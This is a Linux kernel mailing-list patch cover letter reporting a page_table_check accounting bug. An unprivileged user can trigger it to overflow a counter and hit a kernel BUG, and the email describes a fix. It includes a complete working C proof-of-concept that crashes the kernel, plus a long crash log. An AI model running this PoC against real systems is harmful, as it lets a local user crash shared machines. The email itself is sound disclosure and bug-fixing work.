Return-Path: <owner-linux-mm@kvack.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id E324EC44532
	for <linux-mm@archiver.kernel.org>; Wed, 22 Jul 2026 16:48:23 +0000 (UTC)
Received: by kanga.kvack.org (Postfix)
	id A4EF36B008A; Wed, 22 Jul 2026 12:48:22 -0400 (EDT)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 9D9326B0092; Wed, 22 Jul 2026 12:48:22 -0400 (EDT)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id 879436B009B; Wed, 22 Jul 2026 12:48:22 -0400 (EDT)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
	by kanga.kvack.org (Postfix) with ESMTP id 29EEA6B0092
	for <linux-mm@kvack.org>; Wed, 22 Jul 2026 12:48:22 -0400 (EDT)
Received: from smtpin11.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay10.hostedemail.com (Postfix) with ESMTP id 891C4C0287
	for <linux-mm@kvack.org>; Wed, 22 Jul 2026 16:48:21 +0000 (UTC)
X-FDA: 85016995602.11.E0F6239
Received: from mail-pj1-f53.google.com (mail-pj1-f53.google.com [209.85.216.53])
	by imf09.hostedemail.com (Postfix) with ESMTP id A8B6014000F
	for <linux-mm@kvack.org>; Wed, 22 Jul 2026 16:48:19 +0000 (UTC)
Authentication-Results: imf09.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=g5M5yyBB;
	spf=pass (imf09.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.216.53 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1784738899;
	b=sZir/1Rf3Q19qjDBluG/kZvx+3pXheX6QNAPXYurlieAkQv0aF9+vS5/bPNt38a0MiOcgA
	nM58dPm3sp+C8gnsyFrytc1igo30uirb+owi2+spz6pNujcI4TfHUX24khK5xQKCyF7GSf
	PnVJbydemo2jKP8BYcx1fGYY73LWXqo=
ARC-Authentication-Results: i=1;
	imf09.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=g5M5yyBB;
	spf=pass (imf09.hostedemail.com: domain of enjou1224z@gmail.com designates 209.85.216.53 as permitted sender) smtp.mailfrom=enjou1224z@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1784738899;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:references:dkim-signature;
	bh=3b07yGp4To65lpniQhOE0yjATUZxM4/mhcokaCIc7Wg=;
	b=VOMMBhl+s7uAYNgJYSky0E4ltbbeJ5ETp7CH3OKZPsPlyIvco1Xv+iT5Wz04ivKa2Z2wKr
	HfJ0YUIwAoFfMWpNanUQQOEX57UIppIt8JQX1Aa9veKxosQPOGSDfbAM54Uf/Wd50UbuMn
	pINox75HJL3kIan4gbevxp6/a+Jiqnw=
Received: by mail-pj1-f53.google.com with SMTP id 98e67ed59e1d1-38dfe7eb825so7459735a91.0
        for <linux-mm@kvack.org>; Wed, 22 Jul 2026 09:48:19 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784738898; x=1785343698; darn=kvack.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=3b07yGp4To65lpniQhOE0yjATUZxM4/mhcokaCIc7Wg=;
        b=g5M5yyBB/VreNziRq1sMWJKvSbWi/lywXQCDHlWON822URkx5XLKXqDY8NOEB1Q1xE
         69+6JfczCbmw3hEhR4LHbN1vgaJrZC+ct1rfsb5/pn+c9NruiTKRsMv7Mh76+AtDYVQE
         6BF0Nbf4x7K9NGbOBfJw/L3IurOjvGZqtjtnhPcSx0Gj+/2RmeAP4nmUVUusSe0m7jIp
         TRuRYeBbFg7K8QlQcPy27Ee0jfUe3y6Nd+D7MXjPgvKSDxBrrG0pk61akd0QHxoxP93F
         PqY7Yi3oBa2mfDdcaXUHiEwamfTBx4Ox/DrnEtZyOoZWDse+z279MzZ/3aHGOuw/GT5E
         u9jQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784738898; x=1785343698;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=3b07yGp4To65lpniQhOE0yjATUZxM4/mhcokaCIc7Wg=;
        b=E+Su/W6EG3tzXPiLf0apo6+5cn31Gd6c0zcf6GaMfURNxDhj6IzEDKsfD7IPCQmpt9
         gWxZqthuvbuavKhLsyyVt29yiesTccKcndkmmendVN3vaCFcMkjHlX4vNdZwYaNQBRHj
         Udy6N+s+IWT2IAvlL7/C8AJW2Pfvvvjt6HRuEGOyduEqLmWp2Dt36z8qJfPW8V88QPRs
         7PzuQWTvlld65xHA/MdJoEtW4G7Ol3fPORwauC+wVlzAmnIbCgQKlYR34ad4q6hBVU83
         fafe5xv9G+yl+ybOjhzLra+QENb3MMHWoPklVg0X6etn8MYjFtVev7h4YrnDDxVM4llP
         1h4g==
X-Gm-Message-State: AOJu0YxT4/F5jDuyUUQwHJfBNzi+potnde+CRgWVgoHnjrrzqmnCEypx
	4PriDG1rLO5HRauqBdMfVAO2XAUKOJuL/JQoWfUy8fdyiKddvmuEA/2E2KPeyir4Chw=
X-Gm-Gg: AR+sD11kDCNZpBx/anN3qNDJYrYa7K1oyYqSyMAdBJLBVgi6hz1TtzLevmHxNGNxZoD
	DVho2zlOkdzvQix6Hpzg8DcTnrB599DLnD0ZZjqdZAUu6BQG1TcbYywtafqUT29d3cmPlypX9vM
	DBfkUEDnFElrj9a0UZilDyvSvnF6SNP8m7ymzVmgLnuwRCRkQW4GttfMzy0mYsIl22Tnxbd/tWd
	Ij+MsQda+LyfROP11cknOX8mtCM3pisyQyp/QpGyPk8ZnUsNWM7HvcT9MyydH1JLL1D8Ktd1BJL
	WDA6Pf6wpQTedryVhr05MGSV0tRLkqUnbNWu2NrLvEgFWhm1xU4ksN1tuk4nOJblJbWaQwcY+gj
	7ER5LSwNLxTSc4FSTUq8uvj8dj+cF87o/gyelng4DZzYRQDMrPe5BdgW0bvd8wFWlHnOUkmUEQh
	c57avmQMdg3xq2oBcbBrBv
X-Received: by 2002:a17:90b:57ce:b0:38e:7239:b93b with SMTP id 98e67ed59e1d1-38e7239ba41mr14661088a91.30.1784738898053;
        Wed, 22 Jul 2026 09:48:18 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([123.114.53.210])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38e9218a25esm3547452a91.15.2026.07.22.09.48.15
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 22 Jul 2026 09:48:17 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: linux-mm@kvack.org
Cc: pasha.tatashin@soleen.com,
	akpm@linux-foundation.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai,
	enjou1224z@gmail.com
Subject: [PATCH v3 0/1] mm/page_table_check: skip special zero mappings
Date: Thu, 23 Jul 2026 00:48:12 +0800
Message-ID: <cover.1784717203.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.51.0
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Stat-Signature: fpfhkurzs6oprd56xzstp6u6omareby9
X-Rspamd-Server: rspam07
X-Rspamd-Queue-Id: A8B6014000F
X-Rspam-User: 
X-HE-Tag: 1784738899-283065
X-HE-Meta: U2FsdGVkX19A/bztWorybIKuZpG8uomkT8egEYaWdBkr/ynRj6UZdRNsmpp8Bf0dPrStzE+xJcSxmDFzobI4+mD8IG2UUnY/n/l2KPnZ+0c3auruxuqc4HKGGNuvoautmw9f1avA7kKZSIyuqmyFH8CAXECPbSmobahYU597wmdWQ9o4zkxzpRf8Ntw88zSf/yRbskgNSUWU4ngTH6fDA68bl9USJRBPS/F2uy8nZafYzmsxSjARQPsMR/dx6g6oHM483H9qT+vj4G3KB2CAjOzCnDE5vlP7vA5jRW76tpr73E067SFQ6JMNTnKB4z30WcbwKdj0fT8IN23XWW7P6JXX4b1zDpPjIyybmV1IXb1pzLRUCr2ncDVT1/NgD7olbMjqSiTmGhwjTGOEj9d5cT8Qm+2WWlIWVV4yD9q/zibaG+dgN4ykUi4wGFDoQKWcnl2mjsEpP8ZNpJp5lIzrZS/zBtULwhd4QGGX/+gJK/uPd4+U5ihu4gX1ozKOPlfmUTbAnTR8eiDA1dXuGKmU45Ew0R4nTfaH/21i3gMHURZPpnaBnom9ECm2whSAqWYliV+Zzwrd6fB3OJwpS8LwP4W/URFiGobQlmApmCdx8W1U2JsWYfzovKfxyXzHHBVfcsvQ5577NPCdRNmNlRKoh4MFzaAo42xlFMFBSK8wgkVHNFZcDd7grfrsk4rBgNgZhU8Efa/VbaZc2+pF9JGMZMItwrgAHqW0bQFG2/EtpUsB+tfAeLRhmG48G82V3xW6AqLiEb2IESw19WTrEZcn9oMLc0sMr96CN4BjJkhkKOzkjhJ5E3Vkp3duEC9JjCBfXrK5LSjVD3YNLBbnJkd8zFQnh1S1/KEZQ2MmszY5v73MHcuDUVUP5F9Jm+nyZmhnxU2BKj6BB3ESFkcgxmnn0dAeszRmDUo0hgYttVs/CZGvHI+dNthHIE7LSzc+TXXwCVgwWI3kbjRl3zs6fxK
 gvD2Ue7X
 VmUwdPR7wSJImz6Osjtm1mEIi01jK7RhDxickIQ32lZGWCz4Z8+Sgedx4v7SRkTactVSJcncgbqK7OjbBuga/90WUO5hJnMD9jdu33JOTf75UDBA1COJpZGkTc+ohUpglB9rSn2qiS8yB021k2g/BBv6ry9jDpj0jRbUdFBxwmF7nOS0/IZ4cKoAcU+AFRTu6bR1F0OMut99U8mPRhGbcdSH6ZvRefl1r0XmRgfPJ5iFK3IDM8woPg5W32FdKwHTk1un+zTJjQ8N353zq8XK3sdQUIqKJnomz1AoSs8P+BhOX8ce6dKc6UGeu6nrVtyZC03CGEtZdDRpsDe5nuw2FmYyo15X8CtoL4QKDNu9PAMg/+yL/7IkGxAL0SYaIp3Uy84CGpeQyKNXDm+4=
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
List-Unsubscribe: <mailto:majordomo@kvack.org>

From: Zhiling Zou <zhilinz@nebusec.ai>

Hi Linux kernel maintainers,

We found and validated an issue in mm/page_table_check.c. The bug is
reachable by a non-root user directly, without user or network
namespaces.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

page_table_check_set() and page_table_check_clear() account mappings
based on whether the backing page is PageAnon(). The shared zero page
and huge zero mappings are special mappings, not ordinary file-backed
pages, but page_table_check can still account them in file_map_count.

For the reported crash, private anonymous read faults install many
read-only PTEs that point at the shared zero page. Those entries are
installed with pte_mkspecial(), yet __page_table_check_ptes_set() still
reaches page_table_check_set() and increments file_map_count for the
zero-page PFN until it wraps and hits the existing BUG_ON().

The same accounting bug also exists in the huge zero PMD path.
set_huge_zero_folio() installs a user-visible huge zero PMD, and
__page_table_check_pmds_set() can send that mapping to the same
page_table_check_set() consumer. Some architectures do not implement
pmd_special(), so the PMD side needs an explicit huge-zero check rather
than another special-bit test.

This fix skips shared zero-page PTEs via pte_special() and skips huge
zero PMDs by identifying the mapped folio directly. That keeps the
generic counters and page_ext layout unchanged, while covering the PMD
path on architectures where pmd_special() is a no-op.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    ./poc

The current PoC disables THP with MADV_NOHUGEPAGE, so it exercises the
shared zero-page PTE path directly. The PMD path has the same root
cause and is fixed by the same change.

We run the PoC in a 16 vCPU, 24 GB RAM x86 QEMU environment with
panic_on_warn=0.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef MADV_POPULATE_READ
#define MADV_POPULATE_READ 22
#endif

static unsigned long long env_ull(const char *name, unsigned long long def)
{
	const char *s = getenv(name);
	char *end = NULL;
	unsigned long long v;

	if (!s || !*s)
		return def;

	errno = 0;
	v = strtoull(s, &end, 0);
	if (errno || !end || *end) {
		fprintf(stderr, "invalid %s=%s\n", name, s);
		exit(2);
	}
	return v;
}

static void worker(int sync_fd, unsigned long long gigabytes,
		   unsigned long long base_addr_tb)
{
	const unsigned long long len = gigabytes << 30;
	const uintptr_t hint = (uintptr_t)(base_addr_tb << 40);
	void *addr;
	char c;

	if (read(sync_fd, &c, 1) < 0) {
		perror("read(sync_fd)");
		_exit(1);
	}
	close(sync_fd);

	addr = mmap((void *)hint, len, PROT_READ,
		    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE |
			    MAP_FIXED_NOREPLACE,
		    -1, 0);
	if (addr == MAP_FAILED && errno == EEXIST) {
		addr = mmap(NULL, len, PROT_READ,
			    MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1,
			    0);
	}
	if (addr == MAP_FAILED) {
		fprintf(stderr, "[%d] mmap(%llu GB) failed: %s\n", getpid(),
			gigabytes, strerror(errno));
		_exit(1);
	}

	if (madvise(addr, len, MADV_NOHUGEPAGE) != 0) {
		fprintf(stderr, "[%d] MADV_NOHUGEPAGE failed: %s\n", getpid(),
			strerror(errno));
		_exit(1);
	}

	fprintf(stderr, "[%d] populating %llu GB at %p\n", getpid(), gigabytes,
		addr);
	fflush(stderr);

	if (madvise(addr, len, MADV_POPULATE_READ) != 0) {
		fprintf(stderr, "[%d] MADV_POPULATE_READ failed: %s\n", getpid(),
			strerror(errno));
		_exit(1);
	}

	fprintf(stderr, "[%d] populated; holding mapping\n", getpid());
	fflush(stderr);
	for (;;)
		pause();
}

int main(void)
{
	const unsigned long long workers = env_ull("POC_WORKERS", 16);
	const unsigned long long gigabytes = env_ull("POC_GB_PER_WORKER", 513);
	const unsigned long long base_addr_tb = env_ull("POC_BASE_ADDR_TB", 4);
	pid_t *pids;
	int sync_pipe[2];
	unsigned long long i;

	if (workers == 0 || gigabytes == 0) {
		fprintf(stderr, "POC_WORKERS and POC_GB_PER_WORKER must be > 0\n");
		return 2;
	}

	printf("workers=%llu gb_per_worker=%llu total_gb=%llu base_addr_tb=%llu\n",
	       workers, gigabytes, workers * gigabytes, base_addr_tb);
	fflush(stdout);

	pids = calloc(workers, sizeof(*pids));
	if (!pids) {
		perror("calloc");
		return 1;
	}

	if (pipe(sync_pipe) != 0) {
		perror("pipe");
		return 1;
	}

	for (i = 0; i < workers; i++) {
		pid_t pid = fork();

		if (pid < 0) {
			perror("fork");
			return 1;
		}
		if (pid == 0) {
			close(sync_pipe[1]);
			worker(sync_pipe[0], gigabytes, base_addr_tb);
		}
		pids[i] = pid;
	}

	close(sync_pipe[0]);
	close(sync_pipe[1]);

	for (;;) {
		int status;
		pid_t pid = wait(&status);

		if (pid < 0) {
			if (errno == EINTR)
				continue;
			perror("wait");
			return 1;
		}

		if (WIFEXITED(status))
			fprintf(stderr, "child %d exited with status %d\n", pid,
				WEXITSTATUS(status));
		else if (WIFSIGNALED(status))
			fprintf(stderr, "child %d killed by signal %d\n", pid,
				WTERMSIG(status));
		fflush(stderr);
	}
}
------END poc.c--------

----BEGIN crash log----

[ 1513.218556][T10794] kernel BUG at mm/page_table_check.c:121!
[ 1513.219101][T10785] kernel BUG at mm/page_table_check.c:121!
[ 1513.219102][T10787] kernel BUG at mm/page_table_check.c:121!
[ 1513.219103][T10795] kernel BUG at mm/page_table_check.c:121!
[ 1513.219106][T10791] kernel BUG at mm/page_table_check.c:121!
[ 1513.219146][T10785] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
[ 1513.219173][T10785] CPU: 4 UID: 1028 PID: 10785 Comm: poc Tainted: G        W           7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[ 1513.219181][T10785] Tainted: [W]=WARN
[ 1513.219184][T10785] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1513.219191][T10785] RIP: page_table_check_set+0x47a/0x660
[ 1513.219223][T10785] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
All code
========
   0:	c0 0f 85             	rorb   $0x85,(%rdi)
   3:	83 00 00             	addl   $0x0,(%rax)
   6:	00 49 8d             	add    %cl,-0x73(%rcx)
   9:	7d 04                	jge    0xf
   b:	be 04 00 00 00       	mov    $0x4,%esi
  10:	e8 bb bc f5 ff       	call   0xfffffffffff5bcd0
  15:	b8 01 00 00 00       	mov    $0x1,%eax
  1a:	f0 41 0f c1 45 04    	lock xadd %eax,0x4(%r13)
  20:	83 c0 01             	add    $0x1,%eax
  23:	0f 89 bf fe ff ff    	jns    0xfffffffffffffee8
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	48 89 ef             	mov    %rbp,%rdi
  2f:	e8 3c ee ff ff       	call   0xffffffffffffee70
  34:	48 89 c3             	mov    %rax,%rbx
  37:	e9 cd fe ff ff       	jmp    0xffffffffffffff09
  3c:	e8                   	.byte 0xe8
  3d:	af                   	scas   %es:(%rdi),%eax
  3e:	b2 74                	mov    $0x74,%dl

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	48 89 ef             	mov    %rbp,%rdi
   5:	e8 3c ee ff ff       	call   0xffffffffffffee46
   a:	48 89 c3             	mov    %rax,%rbx
   d:	e9 cd fe ff ff       	jmp    0xfffffffffffffedf
  12:	e8                   	.byte 0xe8
  13:	af                   	scas   %es:(%rdi),%eax
  14:	b2 74                	mov    $0x74,%dl
[ 1513.219227][T10785] RSP: 0018:ffa00000174df708 EFLAGS: 00010282
[ 1513.219233][T10785] RAX: 0000000080000004 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
[ 1513.219236][T10785] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
[ 1513.219239][T10785] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
[ 1513.219242][T10785] R10: ff11000100cf9ebf R11: 0000000000000007 R12: 0000000000000000
[ 1513.219245][T10785] R13: ff11000100cf9eb8 R14: dffffc0000000000 R15: 00000000000131fd
[ 1513.219249][T10785] FS:  00007f4996890780(0000) GS:ff110005d0a68000(0000) knlGS:0000000000000000
[ 1513.219255][T10785] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1513.219258][T10785] CR2: 00005606316be348 CR3: 00000001a2981000 CR4: 0000000000751ef0
[ 1513.219261][T10785] PKRU: 55555554
[ 1513.219263][T10785] Call Trace:
[ 1513.219266][T10785]  <TASK>
[ 1513.219275][T10785]  __page_table_check_ptes_set+0x19e/0x310
[ 1513.219281][T10785]  ? __pfx___page_table_check_ptes_set+0x10/0x10
[ 1513.219288][T10785]  ? __pfx_pfn_pte+0x10/0x10
[ 1513.219302][T10785]  do_anonymous_page+0x11f3/0x1df0
[ 1513.219311][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219322][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219330][T10785]  __handle_mm_fault+0x151f/0x1f90
[ 1513.219337][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219343][T10785]  ? __pfx_do_raw_spin_lock+0x10/0x10
[ 1513.219357][T10785]  ? __pfx___handle_mm_fault+0x10/0x10
[ 1513.219365][T10785]  ? pte_offset_map_lock+0xf5/0x260
[ 1513.219370][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219375][T10785]  ? find_held_lock+0x2b/0x80
[ 1513.219388][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219392][T10785]  ? follow_page_pte+0x3fb/0xf50
[ 1513.219402][T10785]  handle_mm_fault+0x2ad/0x8c0
[ 1513.219413][T10785]  __get_user_pages+0x3b5/0x29a0
[ 1513.219428][T10785]  ? __pfx___get_user_pages+0x10/0x10
[ 1513.219434][T10785]  ? rcu_is_watching+0x12/0xc0
[ 1513.219444][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219487][T10785]  faultin_page_range+0x276/0x6c0
[ 1513.219493][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219501][T10785]  madvise_do_behavior+0x2ce/0x4a0
[ 1513.219513][T10785]  ? __pfx_madvise_do_behavior+0x10/0x10
[ 1513.219520][T10785]  ? down_read+0x142/0x460
[ 1513.219548][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219552][T10785]  ? rw_verify_area+0x71/0x560
[ 1513.219563][T10785]  do_madvise+0x12e/0x1b0
[ 1513.219569][T10785]  ? __pfx_do_madvise+0x10/0x10
[ 1513.219574][T10785]  ? __pfx_vfs_write+0x10/0x10
[ 1513.219595][T10785]  ? __pfx_ksys_write+0x10/0x10
[ 1513.219605][T10785]  __x64_sys_madvise+0xa9/0x110
[ 1513.219609][T10785]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1513.219614][T10785]  ? lockdep_hardirqs_on+0x7b/0x110
[ 1513.219620][T10785]  do_syscall_64+0x116/0xf80
[ 1513.219628][T10785]  ? irqentry_exit+0x117/0x830
[ 1513.219636][T10785]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ 1513.219640][T10785] RIP: 0033:0x7f499699fbf7
[ 1513.219659][T10785] Code: ff e8 2d 7d ff ff 48 8b 54 24 28 64 48 2b 14 25 28 00 00 00 75 05 48 83 c4 38 c3 e8 f3 ff 00 00 0f 1f 00 b8 1c 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d e9 81 0d 00 f7 d8 64 89 01 48
All code
========
   0:	ff                   	ljmp   (bad)
   1:	e8 2d 7d ff ff       	call   0xffffffffffff7d33
   6:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
   b:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx
  12:	00 00 
  14:	75 05                	jne    0x1b
  16:	48 83 c4 38          	add    $0x38,%rsp
  1a:	c3                   	ret
  1b:	e8 f3 ff 00 00       	call   0x10013
  20:	0f 1f 00             	nopl   (%rax)
  23:	b8 1c 00 00 00       	mov    $0x1c,%eax
  28:	0f 05                	syscall
  2a:*	48 3d 01 f0 ff ff    	cmp    $0xfffffffffffff001,%rax		<-- trapping instruction
  30:	73 01                	jae    0x33
  32:	c3                   	ret
  33:	48 8b 0d e9 81 0d 00 	mov    0xd81e9(%rip),%rcx        # 0xd8223
  3a:	f7 d8                	neg    %eax
  3c:	64 89 01             	mov    %eax,%fs:(%rcx)
  3f:	48                   	rex.W

Code starting with the faulting instruction
===========================================
   0:	48 3d 01 f0 ff ff    	cmp    $0xfffffffffffff001,%rax
   6:	73 01                	jae    0x9
   8:	c3                   	ret
   9:	48 8b 0d e9 81 0d 00 	mov    0xd81e9(%rip),%rcx        # 0xd81f9
  10:	f7 d8                	neg    %eax
  12:	64 89 01             	mov    %eax,%fs:(%rcx)
  15:	48                   	rex.W
[ 1513.219663][T10785] RSP: 002b:00007ffc39138e78 EFLAGS: 00000202 ORIG_RAX: 000000000000001c
[ 1513.219668][T10785] RAX: ffffffffffffffda RBX: 0000040000000000 RCX: 00007f499699fbf7
[ 1513.219671][T10785] RDX: 0000000000000016 RSI: 0000008040000000 RDI: 0000040000000000
[ 1513.219674][T10785] RBP: 0000008040000000 R08: 0000000000000000 R09: 0000000000000000
[ 1513.219677][T10785] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000201
[ 1513.219679][T10785] R13: 0000040000000000 R14: 0000000000000002 R15: 00005575774bbd18
[ 1513.219706][T10785]  </TASK>
[ 1513.219708][T10785] Modules linked in:
[ 1513.219718][T10785] ---[ end trace 0000000000000000 ]---
[ 1513.219719][T10795] Oops: invalid opcode: 0000 [#2] SMP KASAN NOPTI
[ 1513.219722][T10785] RIP: page_table_check_set+0x47a/0x660
[ 1513.219728][T10785] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
All code
========
   0:	c0 0f 85             	rorb   $0x85,(%rdi)
   3:	83 00 00             	addl   $0x0,(%rax)
   6:	00 49 8d             	add    %cl,-0x73(%rcx)
   9:	7d 04                	jge    0xf
   b:	be 04 00 00 00       	mov    $0x4,%esi
  10:	e8 bb bc f5 ff       	call   0xfffffffffff5bcd0
  15:	b8 01 00 00 00       	mov    $0x1,%eax
  1a:	f0 41 0f c1 45 04    	lock xadd %eax,0x4(%r13)
  20:	83 c0 01             	add    $0x1,%eax
  23:	0f 89 bf fe ff ff    	jns    0xfffffffffffffee8
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	48 89 ef             	mov    %rbp,%rdi
  2f:	e8 3c ee ff ff       	call   0xffffffffffffee70
  34:	48 89 c3             	mov    %rax,%rbx
  37:	e9 cd fe ff ff       	jmp    0xffffffffffffff09
  3c:	e8                   	.byte 0xe8
  3d:	af                   	scas   %es:(%rdi),%eax
  3e:	b2 74                	mov    $0x74,%dl

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	48 89 ef             	mov    %rbp,%rdi
   5:	e8 3c ee ff ff       	call   0xffffffffffffee46
   a:	48 89 c3             	mov    %rax,%rbx
   d:	e9 cd fe ff ff       	jmp    0xfffffffffffffedf
  12:	e8                   	.byte 0xe8
  13:	af                   	scas   %es:(%rdi),%eax
  14:	b2 74                	mov    $0x74,%dl
[ 1513.219732][T10785] RSP: 0018:ffa00000174df708 EFLAGS: 00010282
[ 1513.219730][T10795] CPU: 7 UID: 1028 PID: 10795 Comm: poc Tainted: G      D W           7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[ 1513.219736][T10785]
[ 1513.219740][T10795] Tainted: [D]=DIE, [W]=WARN
[ 1513.219739][T10785] RAX: 0000000080000004 RBX: ff11000100cf9e70 RCX: ffffffff82272c45
[ 1513.219743][T10795] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1513.219744][T10785] RDX: ffe21c002019f3d8 RSI: 0000000000000004 RDI: ff11000100cf9ebc
[ 1513.219748][T10785] RBP: 00000000000131fc R08: 0000000000000001 R09: ffe21c002019f3d7
[ 1513.219752][T10785] R10: ff11000100cf9ebf R11: 0000000000000007 R12: 0000000000000000
[ 1513.219748][T10795] RIP: page_table_check_set+0x47a/0x660
[ 1513.219755][T10785] R13: ff11000100cf9eb8 R14: dffffc0000000000 R15: 00000000000131fd
[ 1513.219760][T10795] Code: c0 0f 85 83 00 00 00 49 8d 7d 04 be 04 00 00 00 e8 bb bc f5 ff b8 01 00 00 00 f0 41 0f c1 45 04 83 c0 01 0f 89 bf fe ff ff 90 <0f> 0b 48 89 ef e8 3c ee ff ff 48 89 c3 e9 cd fe ff ff e8 af b2 74
All code
========
   0:	c0 0f 85             	rorb   $0x85,(%rdi)
   3:	83 00 00             	addl   $0x0,(%rax)
   6:	00 49 8d             	add    %cl,-0x73(%rcx)
   9:	7d 04                	jge    0xf
   b:	be 04 00 00 00       	mov    $0x4,%esi
  10:	e8 bb bc f5 ff       	call   0xfffffffffff5bcd0
  15:	b8 01 00 00 00       	mov    $0x1,%eax
  1a:	f0 41 0f c1 45 04    	lock xadd %eax,0x4(%r13)
  20:	83 c0 01             	add    $0x1,%eax
  23:	0f 89 bf fe ff ff    	jns    0xfffffffffffffee8
  29:	90                   	nop
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	48 89 ef             	mov    %rbp,%rdi
  2f:	e8 3c ee ff ff       	call   0xffffffffffffee70
  34:	48 89 c3             	mov    %rax,%rbx
  37:	e9 cd fe ff ff       	jmp    0xffffffffffffff09
  3c:	e8                   	.byte 0xe8
  3d:	af                   	scas   %es:(%rdi),%eax
  3e:	b2 74                	mov    $0x74,%dl

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	48 89 ef             	mov    %rbp,%rdi
   5:	e8 3c ee ff ff       	call   0xffffffffffffee46
   a:	48 89 c3             	mov    %rax,%rbx
   d:	e9 cd fe ff ff       	jmp    0xfffffffffffffedf
  12:	e8                   	.byte 0xe8
  13:	af                   	scas   %es:(%rdi),%eax
